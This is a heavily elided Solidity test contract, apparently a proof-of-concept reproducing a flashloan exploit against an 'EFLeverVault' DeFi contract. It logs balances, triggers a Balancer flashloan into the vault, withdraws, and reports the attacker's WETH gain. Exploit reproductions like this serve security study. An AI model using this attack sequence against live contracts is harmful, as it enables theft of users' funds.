...
contract ContractTest is DSTest {
    ...
    function testExploit() public {
        ...
        emit log_named_decimal_uint("[Start] Before flashloan, ETH balance in EFLeverVault", address(Vault).balance, 18);
        balancer.flashLoan(address(Vault), tokens, amounts, userData);

        emit log_named_decimal_uint("[Start] After flashloan, ETH balance in EFLeverVault", address(Vault).balance, 18);
        Vault.withdraw(9e16);
        /*
      ...
      (bool status, ) = msg.sender.call.value(to_send)("");  //done
        */
        ...
        emit log_named_decimal_uint("[End] Attacker WETH balance after exploit", WETH.balanceOf(address(this)), 18);
    }
